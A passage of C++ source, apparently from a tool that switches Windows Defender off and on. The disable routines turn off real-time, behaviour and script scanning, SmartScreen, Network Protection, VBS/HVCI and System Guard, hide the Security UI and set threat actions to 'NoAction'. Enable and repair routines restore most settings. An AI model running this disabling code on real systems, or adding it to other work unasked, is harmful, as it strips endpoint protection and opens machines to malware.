      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityCenter",
      hkey))
    {
      reg::set_keyval(hkey, L"Enabled", 0);
    }

    if (reg::create_registry_hkcu(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.Defender",
      hkey))
    {
      reg::set_keyval(hkey, L"Enabled", 0);
    }
  }

  // Re-enable Defender notifications
  //
  void enable_notifications()
  {
    printf("Enabling notifications...\n");

    HKEY hkey;

    // Clear policy notifications
    if (reg::create_registry(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications", hkey))
    {
      reg::delete_value(hkey, L"DisableNotifications");
      reg::delete_value(hkey, L"DisableEnhancedNotifications");
    }

    if (reg::create_registry(
      L"SOFTWARE\\Microsoft\\Windows Defender Security Center\\Notifications", hkey))
    {
      reg::delete_value(hkey, L"DisableNotifications");
      reg::delete_value(hkey, L"DisableEnhancedNotifications");
    }

    // Clear HKCU notification settings
    if (reg::create_registry_hkcu(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityAndMaintenance",
      hkey))
    {
      reg::set_keyval(hkey, L"Enabled", 1);
    }

    if (reg::create_registry_hkcu(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.SystemToast.SecurityCenter",
      hkey))
    {
      reg::set_keyval(hkey, L"Enabled", 1);
    }

    if (reg::create_registry_hkcu(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Notifications\\Settings\\Windows.Defender",
      hkey))
    {
      reg::set_keyval(hkey, L"Enabled", 1);
    }
  }

  void disable_security_ui()
  {
    printf("Locking down Windows Security UI...\n");

    const wchar_t* base = L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center";

    wchar_t path[512];

    swprintf_s(path, L"%ls\\Virus and threat protection", base);
    set_policy_dword(path, L"UILockdown", 1);
    set_policy_dword(path, L"HideRansomwareRecovery", 1);

    swprintf_s(path, L"%ls\\Device security", base);
    set_policy_dword(path, L"UILockdown", 1);
    set_policy_dword(path, L"DisableClearTpmButton", 1);
    set_policy_dword(path, L"HideSecureBoot", 1);
    set_policy_dword(path, L"HideTPMTroubleshooting", 1);
    set_policy_dword(path, L"DisableTpmFirmwareUpdateWarning", 1);

    swprintf_s(path, L"%ls\\Device performance and health", base);
    set_policy_dword(path, L"UILockdown", 1);

    swprintf_s(path, L"%ls\\Account protection", base);
    set_policy_dword(path, L"UILockdown", 1);

    swprintf_s(path, L"%ls\\App and Browser protection", base);
    set_policy_dword(path, L"UILockdown", 1);

    swprintf_s(path, L"%ls\\Family options", base);
    set_policy_dword(path, L"UILockdown", 1);

    // Hide system tray icon
    swprintf_s(path, L"%ls\\Systray", base);
    set_policy_dword(path, L"HideSystray", 1);

    // Remove "Scan with Defender" context menu
    HKEY hkey;
    if (reg::create_registry(L"SOFTWARE\\Classes\\Directory\\shellex\\ContextMenuHandlers\\EPP", hkey))
      reg::set_keyval_sz(hkey, L"", L"");

    if (reg::create_registry(L"SOFTWARE\\Classes\\Drive\\shellex\\ContextMenuHandlers\\EPP", hkey))
      reg::set_keyval_sz(hkey, L"", L"");

    // Remove SecurityHealth from startup
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", hkey))
      reg::delete_value(hkey, L"SecurityHealth");

    // Defender UX lockdown
    HKEY hkey_ux;
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration", hkey_ux))
      reg::set_keyval(hkey_ux, L"DisablePrivacyMode", 1);
  }

  // Restore Windows Security UI
  //
  void enable_security_ui()
  {
    printf("Restoring Windows Security UI...\n");

    // Delete all the UI lockdown policy subkeys
    const wchar_t* subkeys[] = {
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Virus and threat protection",
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security",
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device performance and health",
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Account protection",
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection",
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Family options",
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Systray",
    };

    for (auto& key : subkeys)
      reg::delete_key(HKEY_LOCAL_MACHINE, key);

    // Restore context menu handlers
    HKEY hkey;
    if (reg::create_registry(L"SOFTWARE\\Classes\\Directory\\shellex\\ContextMenuHandlers\\EPP", hkey))
      reg::set_keyval_sz(hkey, L"", L"{09A47860-11B0-4DA5-AFA5-26D86198A780}");

    if (reg::create_registry(L"SOFTWARE\\Classes\\Drive\\shellex\\ContextMenuHandlers\\EPP", hkey))
      reg::set_keyval_sz(hkey, L"", L"{09A47860-11B0-4DA5-AFA5-26D86198A780}");

    // Restore SecurityHealth startup
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", hkey))
    {
      reg::set_keyval_sz(hkey, L"SecurityHealth",
        L"%ProgramFiles%\\Windows Defender\\MSASCuiL.exe");
    }

    // Restore UX
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender\\UX Configuration", hkey))
      reg::delete_value(hkey, L"DisablePrivacyMode");
  }

  // =========================================================================
  // Tier 1.5 - Additional registry-based disabling
  // =========================================================================

  // Disable Web Threat Defense / Enhanced Phishing Protection (Win11 22H2+)
  //
  void disable_wtds()
  {
    printf("Disabling Web Threat Defense (WTDS)...\n");

    // Policy path
    const wchar_t* policy = L"SOFTWARE\\Policies\\Microsoft\\Windows\\WTDS\\Components";
    set_policy_dword(policy, L"CaptureThreatWindow", 0);
    set_policy_dword(policy, L"NotifyMalicious", 0);
    set_policy_dword(policy, L"NotifyPasswordReuse", 0);
    set_policy_dword(policy, L"NotifyUnsafeApp", 0);
    set_policy_dword(policy, L"ServiceEnabled", 0);

    // Direct path
    const wchar_t* direct = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WTDS\\Components";
    set_policy_dword(direct, L"CaptureThreatWindow", 0);
    set_policy_dword(direct, L"NotifyMalicious", 0);
    set_policy_dword(direct, L"NotifyPasswordReuse", 0);
    set_policy_dword(direct, L"NotifyUnsafeApp", 0);
    set_policy_dword(direct, L"ServiceEnabled", 0);

    // Feature flags (Win11 22H2+)
    const wchar_t* flags = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WTDS\\FeatureFlags";
    set_policy_dword(flags, L"BlockUxDisabled", 1);
    set_policy_dword(flags, L"TelemetryCallsEnabled", 0);
  }

  // Re-enable Web Threat Defense
  //
  void enable_wtds()
  {
    printf("Enabling Web Threat Defense (WTDS)...\n");

    // Delete policy keys
    reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\WTDS\\Components");
    reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\WTDS");

    // Restore direct path
    HKEY hkey;
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WTDS\\Components", hkey))
    {
      reg::delete_value(hkey, L"CaptureThreatWindow");
      reg::delete_value(hkey, L"NotifyMalicious");
      reg::delete_value(hkey, L"NotifyPasswordReuse");
      reg::delete_value(hkey, L"NotifyUnsafeApp");
      reg::delete_value(hkey, L"ServiceEnabled");
    }

    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WTDS\\FeatureFlags", hkey))
    {
      reg::delete_value(hkey, L"BlockUxDisabled");
      reg::delete_value(hkey, L"TelemetryCallsEnabled");
    }
  }

  // Disable Application Guard
  //
  void disable_application_guard()
  {
    printf("Disabling Application Guard...\n");

    set_policy_dword(L"SOFTWARE\\Policies\\Microsoft\\AppHVSI", L"AllowAppHVSI_ProviderSet", 0);
    set_policy_dword(L"SOFTWARE\\Policies\\Microsoft\\AppHVSI", L"AuditApplicationGuard", 0);
  }

  // Re-enable Application Guard
  //
  void enable_application_guard()
  {
    printf("Enabling Application Guard...\n");

    reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\AppHVSI");
  }

  // Disable Exploit Guard Network Protection (set to audit mode)
  //
  void disable_exploit_guard()
  {
    printf("Disabling Exploit Guard Network Protection...\n");

    // EnableNetworkProtection: 0 = Disabled, 1 = Block (enabled), 2 = Audit.
    // Use 0 to actually turn the feature off.
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Network Protection",
      L"EnableNetworkProtection", 0);

    // Also disable Controlled Folder Access via policy (complements the WMI call in disable_defender)
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access",
      L"EnableControlledFolderAccess", 0);
  }

  // Re-enable Exploit Guard Network Protection
  //
  void enable_exploit_guard()
  {
    printf("Enabling Exploit Guard Network Protection...\n");

    reg::delete_key(HKEY_LOCAL_MACHINE,
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Network Protection");
    reg::delete_key(HKEY_LOCAL_MACHINE,
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access");
    reg::delete_key(HKEY_LOCAL_MACHINE,
      L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard");
  }

  // Disable additional SmartScreen areas (Legacy Edge, IE zones)
  //
  void disable_smartscreen_extras()
  {
    printf("Disabling SmartScreen extras (Legacy Edge, IE)...\n");

    // Legacy Edge (EdgeHTML) PhishingFilter
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\MicrosoftEdge\\PhishingFilter",
      L"EnabledV9", 0);
    set_policy_dword(
      L"SOFTWARE\\Policies\\Microsoft\\MicrosoftEdge\\PhishingFilter",
      L"PreventOverride", 0);

    // Legacy Edge AppContainer settings (HKCU)
    HKEY hkey;
    if (reg::create_registry_hkcu(
      L"SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppContainer\\Storage\\microsoft.microsoftedge_8wekyb3d8bbwe\\MicrosoftEdge\\PhishingFilter",
      hkey))
    {
      reg::set_keyval(hkey, L"EnabledV9", 0);
      reg::set_keyval(hkey, L"PreventOverride", 0);
    }

    // IE SmartScreen across all security zones (0-4)
    // Value 2301 = 3 disables SmartScreen filter per zone
    for (int zone = 0; zone <= 4; zone++)
    {
      wchar_t path[256];
      swprintf_s(path,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%d",
        zone);
      set_policy_dword(path, L"2301", 3);
    }
  }

  // Re-enable additional SmartScreen areas
  //
  void enable_smartscreen_extras()
  {
    printf("Enabling SmartScreen extras (Legacy Edge, IE)...\n");

    // Clear Legacy Edge policies
    reg::delete_key(HKEY_LOCAL_MACHINE,
      L"SOFTWARE\\Policies\\Microsoft\\MicrosoftEdge\\PhishingFilter");

    // Clear HKCU Legacy Edge AppContainer
    HKEY hkey;
    if (reg::create_registry_hkcu(
      L"SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\CurrentVersion\\AppContainer\\Storage\\microsoft.microsoftedge_8wekyb3d8bbwe\\MicrosoftEdge\\PhishingFilter",
      hkey))
    {
      reg::delete_value(hkey, L"EnabledV9");
      reg::delete_value(hkey, L"PreventOverride");
    }

    // Remove IE zone overrides
    for (int zone = 0; zone <= 4; zone++)
    {
      wchar_t path[256];
      swprintf_s(path,
        L"SOFTWARE\\Policies\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\%d",
        zone);

      HKEY zone_key;
      if (reg::create_registry(path, zone_key))
        reg::delete_value(zone_key, L"2301");
    }
  }

  // Remove WdFilter minifilter altitude registration
  //
  void disable_minifilter_altitude()
  {
    printf("Removing WdFilter minifilter altitude...\n");

    HKEY hkey;
    if (reg::create_registry(
      L"SYSTEM\\CurrentControlSet\\Services\\WdFilter\\Instances\\WdFilter Instance", hkey))
    {
      reg::delete_value(hkey, L"Altitude");
    }
  }

  // Restore WdFilter minifilter altitude registration
  //
  void enable_minifilter_altitude()
  {
    printf("Restoring WdFilter minifilter altitude...\n");

    HKEY hkey;
    if (reg::create_registry(
      L"SYSTEM\\CurrentControlSet\\Services\\WdFilter\\Instances\\WdFilter Instance", hkey))
    {
      // Default altitude for WdFilter is 328010
      reg::set_keyval_sz(hkey, L"Altitude", L"328010");
    }
  }

  // Disable Virtualization Based Security, HVCI and System Guard secure launch
  //
  void disable_vbs()
  {
    printf("Disabling VBS / HVCI / Device Guard...\n");

    // Live control key
    const wchar_t* dg = L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard";
    set_policy_dword(dg, L"EnableVirtualizationBasedSecurity", 0);
    set_policy_dword(dg, L"RequirePlatformSecurityFeatures", 0);
    set_policy_dword(dg, L"Locked", 0);
    set_policy_dword(dg, L"NoLock", 1);
    set_policy_dword(dg, L"Unlocked", 1);
    set_policy_dword(dg, L"RequireMicrosoftSignedBootChain", 0);
    set_policy_dword(dg, L"Mandatory", 0);

    // Policy key
    const wchar_t* dgp = L"SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard";
    set_policy_dword(dgp, L"EnableVirtualizationBasedSecurity", 0);
    set_policy_dword(dgp, L"RequirePlatformSecurityFeatures", 0);
    set_policy_dword(dgp, L"HypervisorEnforcedCodeIntegrity", 0);
    set_policy_dword(dgp, L"HVCIMATRequired", 0);
    // System Guard secure launch (2 = disabled)
    set_policy_dword(dgp, L"ConfigureSystemGuardLaunch", 2);

    // HVCI scenario
    const wchar_t* hvci =
      L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity";
    set_policy_dword(hvci, L"Enabled", 0);
    set_policy_dword(hvci, L"Locked", 0);
    set_policy_dword(hvci, L"HVCIMATRequired", 0);

    // System Guard scenario
    set_policy_dword(
      L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\SystemGuard",
      L"Enabled", 0);
  }

  // Restore Virtualization Based Security / HVCI / Device Guard
  //
  void enable_vbs()
  {
    printf("Restoring VBS / HVCI / Device Guard...\n");

    // Remove the policy overrides entirely (Windows recomputes from hardware/defaults)
    reg::delete_key(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard");

    HKEY hkey;

    // Clear the values we wrote on the live control key
    if (reg::create_registry(L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard", hkey))
    {
      reg::delete_value(hkey, L"EnableVirtualizationBasedSecurity");
      reg::delete_value(hkey, L"RequirePlatformSecurityFeatures");
      reg::delete_value(hkey, L"Locked");
      reg::delete_value(hkey, L"NoLock");
      reg::delete_value(hkey, L"Unlocked");
      reg::delete_value(hkey, L"RequireMicrosoftSignedBootChain");
      reg::delete_value(hkey, L"Mandatory");
    }

    if (reg::create_registry(
      L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity", hkey))
    {
      // Do NOT force Enabled=1 here. Forcing HVCI on can black-screen at boot when a
      // driver is incompatible, and it would turn HVCI on even on machines where it
      // was never enabled. Delete our override and let Windows recompute from
      // hardware/defaults instead.
      reg::delete_value(hkey, L"Enabled");
      reg::delete_value(hkey, L"Locked");
      reg::delete_value(hkey, L"HVCIMATRequired");
    }

    if (reg::create_registry(
      L"SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\SystemGuard", hkey))
    {
      // Likewise, let Windows decide; do not force System Guard secure launch on.
      reg::delete_value(hkey, L"Enabled");
    }
  }

  // Helper: run a command hidden and wait briefly (best-effort)
  //
  static void run_hidden(const wchar_t* command_line)
  {
    wchar_t buffer[512];
    swprintf_s(buffer, L"%ls", command_line);

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi{};

    if (CreateProcessW(NULL, buffer, NULL, NULL, FALSE,
      CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
    {
      WaitForSingleObject(pi.hProcess, 5000);
      CloseHandle(pi.hProcess);
      CloseHandle(pi.hThread);
    }
  }

  // Helper: run a command hidden, wait up to timeout_ms, return its exit code
  // (or (DWORD)-1 if the process could not be launched).
  //
  static DWORD run_and_wait(const wchar_t* command_line, DWORD timeout_ms)
  {
    wchar_t buffer[1024];
    swprintf_s(buffer, L"%ls", command_line);

    STARTUPINFOW si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi{};

    if (!CreateProcessW(NULL, buffer, NULL, NULL, FALSE,
      CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
      return (DWORD)-1;

    WaitForSingleObject(pi.hProcess, timeout_ms);

    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return code;
  }

  // Helper: does a service registration key exist under CurrentControlSet?
  //
  static bool service_key_exists(const wchar_t* service_name)
  {
    wchar_t path[256];
    swprintf_s(path, L"SYSTEM\\CurrentControlSet\\Services\\%ls", service_name);

    HKEY hkey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, path, 0, KEY_READ, &hkey) == ERROR_SUCCESS)
    {
      RegCloseKey(hkey);
      return true;
    }
    return false;
  }

  // Helper: set a service to auto-start and start it, without throwing.
  // Returns true if the service is running (or already running) afterwards.
  //
  static bool start_service_nothrow(const char* service_name)
  {
    auto scm = OpenSCManagerA(0, 0, SC_MANAGER_CONNECT);
    if (!scm)
      return false;

    auto svc = OpenServiceA(scm, service_name,
      SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_CHANGE_CONFIG);

    bool ok = false;
    if (svc)
    {
      ChangeServiceConfigA(svc, SERVICE_NO_CHANGE, SERVICE_AUTO_START,
        SERVICE_NO_CHANGE, 0, 0, 0, 0, 0, 0, 0);

      if (StartServiceA(svc, 0, NULL))
        ok = true;
      else
        ok = (GetLastError() == ERROR_SERVICE_ALREADY_RUNNING);

      CloseServiceHandle(svc);
    }

    CloseServiceHandle(scm);
    return ok;
  }

  // Resolve the inbox MpCmdRun.exe path (%ProgramFiles%\Windows Defender\MpCmdRun.exe).
  // Returns false if it cannot be found.
  //
  static bool resolve_mpcmdrun(wchar_t* out, size_t count)
  {
    wchar_t expanded[MAX_PATH];
    if (!ExpandEnvironmentStringsW(
          L"%ProgramFiles%\\Windows Defender\\MpCmdRun.exe", expanded, MAX_PATH))
      return false;

    if (GetFileAttributesW(expanded) == INVALID_FILE_ATTRIBUTES)
      return false;

    wcsncpy_s(out, count, expanded, _TRUNCATE);
    return true;
  }

  // Repair a Defender installation damaged by a disable cycle.
  //
  // Two problems are fixed here:
  //   1. take_ownership() left several Defender keys owned by Administrators instead
  //      of TrustedInstaller. The PPL engine can then fail to initialise (WinDefend
  //      "did not respond in a timely fashion" / error 1053). We hand ownership back.
  //   2. The platform services (notably MpDefenderCoreService) can be deregistered,
  //      so MsMpEng will not start. We ask Defender to re-register itself via
  //      MpCmdRun -wdenable, and if the Core Service is still missing, -resetplatform.
  //
  void repair_defender_registration()
  {
    printf("Repairing Defender registration (ownership + re-register)...\n");

    // 1. Hand ownership of the keys we seized back to TrustedInstaller.
    const wchar_t* ti_keys[] = {
      L"SOFTWARE\\Microsoft\\Windows Defender",
      L"SYSTEM\\CurrentControlSet\\Services\\WinDefend",
      L"SYSTEM\\CurrentControlSet\\Services\\WdFilter",
      L"SYSTEM\\CurrentControlSet\\Services\\WdBoot",
      L"SYSTEM\\CurrentControlSet\\Services\\WdNisDrv",
      L"SYSTEM\\CurrentControlSet\\Services\\WdNisSvc",
      L"SYSTEM\\CurrentControlSet\\Services\\WdDevFlt",
      L"SYSTEM\\CurrentControlSet\\Services\\Sense",
      L"SYSTEM\\CurrentControlSet\\Services\\MpDefenderCoreService",
    };
    for (auto& k : ti_keys)
      reg::restore_owner_trustedinstaller(HKEY_LOCAL_MACHINE, k);

    // 2. Ask Defender to re-register itself.
    wchar_t mpcmdrun[MAX_PATH * 2];
    if (!resolve_mpcmdrun(mpcmdrun, _countof(mpcmdrun)))
    {
      printf("  MpCmdRun.exe not found - skipping platform re-register.\n");
      return;
    }

    wchar_t cmd[MAX_PATH * 2 + 64];
    swprintf_s(cmd, L"\"%ls\" -wdenable", mpcmdrun);
    printf("  MpCmdRun -wdenable (exit %lu)\n", run_and_wait(cmd, 120000));

    // If the platform registration is damaged (Core Service deregistered), the
    // engine cannot start - do a full platform reset to recreate the service set.
    if (!service_key_exists(L"MpDefenderCoreService"))
    {
      printf("  MpDefenderCoreService missing - running -resetplatform...\n");
      swprintf_s(cmd, L"\"%ls\" -resetplatform", mpcmdrun);
      printf("  MpCmdRun -resetplatform (exit %lu)\n", run_and_wait(cmd, 240000));
    }
  }

  // Defender-related scheduled tasks (full task-scheduler paths)
  //
  static const wchar_t* g_scheduled_tasks[] = {
    L"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance",
    L"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup",
    L"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan",
    L"\\Microsoft\\Windows\\Windows Defender\\Windows Defender Verification",
    L"\\Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh",
  };

  // Disable Defender scheduled tasks
  //
  void disable_scheduled_tasks()
  {
    printf("Disabling Defender scheduled tasks...\n");

    for (auto& task : g_scheduled_tasks)
    {
      wchar_t cmd[640];
      swprintf_s(cmd, L"schtasks.exe /Change /TN \"%ls\" /DISABLE", task);
      run_hidden(cmd);
    }
  }

  // Re-enable Defender scheduled tasks
  //
  void enable_scheduled_tasks()
  {
    printf("Enabling Defender scheduled tasks...\n");

    for (auto& task : g_scheduled_tasks)
    {
      wchar_t cmd[640];
      swprintf_s(cmd, L"schtasks.exe /Change /TN \"%ls\" /ENABLE", task);
      run_hidden(cmd);
    }
  }

  // TODO: create a single function

  bool manage_security_service(bool enable, std::string service_name)
  {
    auto sc_manager = OpenSCManagerA(0, 0, SC_MANAGER_CONNECT);

    if (!sc_manager)
      return false;

    auto service = OpenServiceA(
      sc_manager,
      service_name.c_str(),
      enable ? SERVICE_ALL_ACCESS :
      (SERVICE_CHANGE_CONFIG | SERVICE_STOP | DELETE)
    );

    if (!service)
    {
      CloseServiceHandle(sc_manager);
      return false;
    }

    if (enable)
    {
      // Change to auto-start
      if (!ChangeServiceConfigA(
        service,
        SERVICE_NO_CHANGE,
        SERVICE_AUTO_START,
        SERVICE_NO_CHANGE,
        0, 0, 0, 0, 0, 0, 0
      ))
      {
        throw std::runtime_error("Failed to modify " + service_name + " " + std::to_string(GetLastError()));
        return false;
      }

      // Start the service
      if (!StartServiceA(service, 0, NULL))
      {
        throw std::runtime_error("Failed to start " + service_name);
        return false;
      }
    }
    else
    {
      // Stop the service
      SERVICE_STATUS scStatus;
      if (!ControlService(service, SERVICE_CONTROL_STOP, &scStatus))
      {
        auto last_error = GetLastError();

        if (last_error == ERROR_SERVICE_NOT_ACTIVE)
          return true;

        throw std::runtime_error(
          "Failed to stop " + service_name + " " + std::to_string(last_error)
        );
        return false;
      }

      // Change to DEMAND
      if (!ChangeServiceConfigA(
        service,
        SERVICE_NO_CHANGE,
        SERVICE_DEMAND_START,
        SERVICE_NO_CHANGE,
        0, 0, 0, 0, 0, 0, 0
      ))
      {
        throw std::runtime_error(
          "Failed to modify " + service_name + " " + std::to_string(GetLastError())
        );

        return false;
      }

      // Allow time for service to stop
      // TODO: Handle this automatically
      Sleep(3000);
    }

    return true;
  }

  // Stop or run security center (wscvc)
  // The default value is autostart
  //
  bool manage_security_center(bool enable)
  {
    // handle registry calls
    // https://superuser.com/questions/1199112/how-to-tell-the-state-of-a-service-from-the-registry
    // https://stackoverflow.com/questions/291519/how-does-currentcontrolset-differ-from-controlset001-and-controlset002
    // https://web.archive.org/web/20110514163940/http://support.microsoft.com/kb/103000
    //

    // auto ret = manage_security_service(enable, "wscsvc");

    HKEY hkey;
    if (reg::create_registry(L"SYSTEM\\CurrentControlSet\\Services\\wscsvc", hkey))
    {
      if (enable)
      {
        if (!reg::set_keyval(hkey, L"Start", 2)) // Automatic
        {
          printf("failed to write to wscsvc\n");
          return false;
        }
      }
      else
      {
        if (!reg::set_keyval(hkey, L"Start", 4)) // Disabled
        {
          printf("failed to write to wscsvc\n");
          return false;
        }
      }
    }

    return true;
  }

  // Stop or run the windefend service
  //
  bool manage_windefend(bool enable)
  {
    return manage_security_service(enable, "WinDefend");
  }

  // Disables window defender
  //
  bool disable_defender()
  {
    HKEY hkey;

    // DisableAntiSpyware
    if (reg::create_registry(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", hkey))
    {
      if (!reg::set_keyval(hkey, L"DisableAntiSpyware", 1))
        printf("failed to write to DisableAntiSpyware\n");
    }
    else
      printf("Failed to access Policies\n");

    // SecurityHealth
    if (reg::create_registry(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
      hkey))
    {
      if (!reg::set_keyval_bin(hkey, L"SecurityHealth", 3))
        printf("Failed to write to SecurityHealth\n");
    }
    else
      printf("Failed to access CurrentVersion\n");

    // Protected by anti-tamper
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender", hkey))
    {
      if (!reg::set_keyval(hkey, L"DisableAntiSpyware", 1))
        printf("Failed to write to DisableAntiSpyware\n");
    }
    else
      printf("Failed to access Windows Defender\n");

    // Protected by anti-tamper
    // Start (3 off) (2 on)
    if (reg::create_registry(L"SYSTEM\\CurrentControlSet\\Services\\WinDefend", hkey))
    {
      reg::set_keyval(hkey, L"Start", 3);
    }
    else
      printf("Failed to access CurrentControlSet\n");

    // Protected by anti-tamper
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection", hkey))
    {
      if (!reg::set_keyval(hkey, L"DisableRealtimeMonitoring", 1))
        printf("Failed to write to DisableRealTimeMonitoring\n");
    }
    else
      printf("Failed to access Real-Time Protection");

    auto helper = new wmic::helper(
      "Root\\Microsoft\\Windows\\Defender",
      "MSFT_MpPreference",
      "Set"
    );

    if (auto error = helper->get_last_error())
    {
      printf("Error has occured: %d\n", error);
      return false;
    }

    // string types
    helper->execute("EnableControlledFolderAccess", "Disabled");
    helper->execute("PUAProtection", "disable");

    // bool types
    helper->execute<BOOL>("DisableRealtimeMonitoring", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisableBehaviorMonitoring", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisableBlockAtFirstSeen", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisableIOAVProtection", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisablePrivacyMode", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("SignatureDisableUpdateOnStartupWithoutEngine", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisableArchiveScanning", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisableIntrusionPreventionSystem", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisableScriptScanning", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisableAntiSpyware", wmic::variant_type::t_bool, TRUE);
    helper->execute<BOOL>("DisableAntiVirus", wmic::variant_type::t_bool, TRUE);

    // values
    helper->execute<uint8_t>("SubmitSamplesConsent", wmic::variant_type::t_uint8, 2);
    helper->execute<uint8_t>("MAPSReporting", wmic::variant_type::t_uint8, 0);
    // Threat default actions: 9 = NoAction (take no remediation). Kept consistent
    // with the registry ThreatSeverityDefaultAction entries (also 9).
    helper->execute<uint8_t>("HighThreatDefaultAction", wmic::variant_type::t_uint8, 9);
    helper->execute<uint8_t>("ModerateThreatDefaultAction", wmic::variant_type::t_uint8, 9);
    helper->execute<uint8_t>("LowThreatDefaultAction", wmic::variant_type::t_uint8, 9);
    helper->execute<uint8_t>("SevereThreatDefaultAction", wmic::variant_type::t_uint8, 9);
    helper->execute<uint8_t>("ScanScheduleDay", wmic::variant_type::t_uint8, 8);

    delete helper;

    return true;
  }

  // Enables defender, assumes we have TrustedInstaller permissions
  // Offline-safe recovery helpers (defined further below). Folded into the enable
  // path so a single "enable" recovers a Defender wedged by a disable cycle without
  // needing a separate repair mode or a live engine.
  //
  static void clear_tampering_values();
  static void reset_tamper_protection();
  static void recreate_mpdefendercoreservice();
  static void restore_wdboot_group();

  bool enable_defender()
  {
    HKEY hkey;

    // DisableAntiSpyware
    if (reg::create_registry(L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", hkey))
    {
      if (!reg::set_keyval(hkey, L"DisableAntiSpyware", 0))
        printf("failed to write to DisableAntiSpyware\n");
    }
    else
      printf("Failed to access Policies\n");

    // SecurityHealth
    if (reg::create_registry(
      L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run",
      hkey))
    {
      if (!reg::set_keyval_bin(hkey, L"SecurityHealth", 2))
        printf("Failed to write to SecurityHealth\n");
    }
    else
      printf("Failed to access CurrentVersion\n");

    // Protected by anti-tamper
    if (reg::create_registry(L"SOFTWARE\\Microsoft\\Windows Defender", hkey))
    {
